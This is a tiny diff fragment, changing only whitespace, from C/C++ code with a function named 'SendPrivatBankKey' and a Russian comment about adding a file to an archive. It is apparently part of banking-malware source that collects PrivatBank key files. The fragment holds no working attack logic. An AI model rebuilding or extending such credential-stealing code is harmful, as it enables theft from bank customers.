@@ -120,7 +120,7 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 {
 	if (!File::IsExists((PCHAR)Params))  
 		return;       
-   
+    
 
 
 	// Добавляем фал в архив
